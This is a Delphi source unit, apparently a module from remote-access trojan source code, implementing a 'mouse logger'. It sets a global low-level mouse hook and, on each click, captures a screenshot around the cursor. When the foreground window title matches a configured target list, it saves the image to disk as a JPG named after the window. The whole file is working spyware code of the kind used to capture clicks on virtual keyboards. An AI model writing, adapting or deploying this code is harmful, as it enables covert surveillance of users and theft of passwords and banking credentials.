unit UnitMouseLogger;

interface

uses
  windows,
  messages,
  sysutils,
  StrUtils,
  ThreadUnit,
  UnitObjeto,
  vcl.Graphics,
  untCapFuncs,
  GlobalVars,
  Classes,
  UnitFuncoesDiversas;

procedure IniciarMouseLogger;
procedure StopMouseLogger;
function LowLevelKeybdHookProc_mouse(nCode, wParam, lParam : integer) : integer; stdcall;

implementation

var
  kHook_mouse : cardinal = 0;

procedure DrawCursor(ScreenShotBitmap : TBitmap);
var
  r: TRect;
  CI: TCursorInfo;
  Icon: TIcon;
  II: TIconInfo;
begin
  r := ScreenShotBitmap.Canvas.ClipRect;
  Icon := TIcon.Create;
  try
    CI.cbSize := SizeOf(CI);
    if GetCursorInfo(CI) then
      if CI.Flags = CURSOR_SHOWING then
      begin
        Icon.Handle := CopyIcon(CI.hCursor);
        if GetIconInfo(Icon.Handle, II) then
        begin
          ScreenShotBitmap.Canvas.Draw(
                50,
                50,
                Icon
                );
        end;
      end;
  finally
    Icon.Free;
  end;
end;

Procedure TakeScreenshot(Bitmap: Tbitmap; Monochrome : Boolean; Depth : TPixelFormat = pf16bit);
var
  DC: THandle;
  CI: TCursorInfo;
  x, y: integer;
begin
  CI.cbSize := SizeOf(CI);
  if GetCursorInfo(CI) then
  begin
    x := ci.ptScreenPos.x;
    y := ci.ptScreenPos.y;
  end;

  try
    DC := GetDC(GetDesktopWindow);
    Bitmap.Width := 100;
    Bitmap.Height := 100;
    Bitmap.PixelFormat := Depth;
    BitBlt(Bitmap.Canvas.Handle, 0, 0, 100, 100, DC, x - 50, y - 50, SRCCOPY);
    ReleaseDC(GetDesktopWindow, DC);
    Bitmap.MonoChrome := Monochrome;
    Bitmap.Dormant;
    Bitmap.FreeImage;
    DrawCursor(Bitmap);
    except
  end;
end;

function ActiveCaption: WideString;
var
  Handle: THandle;
  Title: array [0..255] of WideChar;
begin
  Result := '';
  Handle := GetForegroundWindow;
  if Handle <> 0 then
  begin
    GetWindowTextW(Handle, Title, SizeOf(Title));
    Result := WideString(Title);
  end;
end;

function UpperString(S: WideString): WideString;
var
  i: Integer;
begin
  for i := 1 to Length(S) do
    S[i] := widechar(CharUpperW(PWideChar(S[i])));
  Result := S;
end;

function LowerString(S: WideString): WideString;
var
  i: Integer;
begin
  for i := 1 to Length(S) do
    S[i] := widechar(CharLowerW(PWideChar(S[i])));
  Result := S;
end;

function PossoGravar(Janela: WideString): boolean;
var
  s: WideString;
begin
  result := true;
  s := RelacaoJanelas;
  if s = '' then Exit;
  result := False;

  while posex(';', s) > 0 do
  begin
    if posex(UpperString(Copy(s, 1, posex(';', s) - 1)), UpperString(Janela)) > 0 then
    begin
      result := True;
      break;
    end else
    begin
      delete(s, 1, posex(';', s));
    end;
  end;

  if (s <> '')  and (Result = False) then
  result := posex(UpperString(s), UpperString(Janela)) > 0;
end;

procedure PegarTela;
var
  Bitmap: TBitmap;
  TempFile, TempStr, Janela: WideString;
  MS: TMemoryStream;
begin
  Janela := ActiveCaption;
  if Janela = '' then Exit;
  if PossoGravar(Janela) = False then Exit;
  
  Bitmap := TBitmap.Create;
  TakeScreenShot(Bitmap, false, pf32bit);
  MS := TMemoryStream.Create;
  Bitmap.SaveToStream(MS);
  Bitmap.Free;
  MS.Position := 0;

  TempFile := MouseFolder + ValidarString(IntToStr(GetTickCount) + '^' + Copy(Janela, 1, 50));

  CriarArquivo(pWideChar(TempFile), pWideChar(MS.Memory), MS.Size);
  MS.Free;

  TempStr := BMPFiletoJPGString(TempFile, 40);
  CriarArquivo(pWideChar(TempFile + '.jpg'), pWideChar(TempStr), Length(TempStr) * 2);
  DeleteFileW(pWideChar(TempFile));
end;

function LowLevelKeybdHookProc_mouse(nCode, wParam, lParam : integer) : integer; stdcall;
begin
  if (wParam = WM_LBUTTONDOWN) or
     (wParam = WM_RBUTTONDOWN) or
     (wParam = WM_MBUTTONDOWN) or
     (wParam = WM_LBUTTONDBLCLK) or
     (wParam = WM_RBUTTONDBLCLK) then PegarTela;
  Result := CallNextHookEx(kHook_mouse, nCode, wParam, lParam);
end;

procedure IniciarMouseLogger;
begin
  if kHook_mouse <> 0 then UnhookWindowsHookEx(kHook_mouse);
  kHook_mouse := SetWindowsHookExW(14, @LowLevelKeybdHookProc_mouse, GetModuleHandle(0), 0);
end;

procedure StopMouseLogger;
begin
  if kHook_mouse <> 0 then UnhookWindowsHookEx(kHook_mouse);
  kHook_mouse := 0;
end;

end.